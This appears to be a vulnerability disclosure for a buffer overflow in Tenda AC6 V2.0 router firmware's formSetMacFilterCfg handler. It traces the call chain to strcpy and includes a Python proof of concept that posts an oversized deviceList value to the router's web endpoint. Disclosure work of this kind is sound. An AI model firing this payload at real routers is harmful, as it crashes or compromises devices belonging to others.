# Tenda AC6V2.0_V15.03.06.23_multi firmware is vulnerable to Buffer Overflow via function "formSetMacFilterCfg"

Firmware download website:

[AC6V2.0升级软件_腾达(Tenda)官方网站](https://www.tenda.com.cn/material/show/102855)

In the function `formSetMacFilterCfg`, user-supplied parameters **`macFilterType`** and **`deviceList`** are passed to a function **without input validation**, ultimately leading to an **overflow**.

formSetMacFilterCfg-》set_macfilter_rules-》set_macfilter_rules_by_one-》parse_macfilter_rule-》strcpy

![image-20250614182456806](https://kingimg.oss-cn-hangzhou.aliyuncs.com/img/image-20250614182456806.png)

![image-20250619135927395](C:\Users\SolitaryGrass\AppData\Roaming\Typora\typora-user-images\image-20250619135927395.png)

![image-20250619135900666](https://kingimg.oss-cn-hangzhou.aliyuncs.com/img/image-20250619135900666.png)

poc

```
import requests
def send_payload(url, type,list):
    params = {b'macFilterType': type,b'deviceList': list}
    cookie={'password':'ssetgb'}
    response = requests.post(url, cookies=cookie, data=params)
    print(f"Status Code: {response.status_code}")
    print(f"Response Text: {response.text}")
url="http://192.168.1.1/goform/setMacFilterCfg"
type=b'black'
list="DEADBEEFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r11"
send_payload(url, type, list)
```

![image-20250616215744978](https://kingimg.oss-cn-hangzhou.aliyuncs.com/img/image-20250616215744978.png)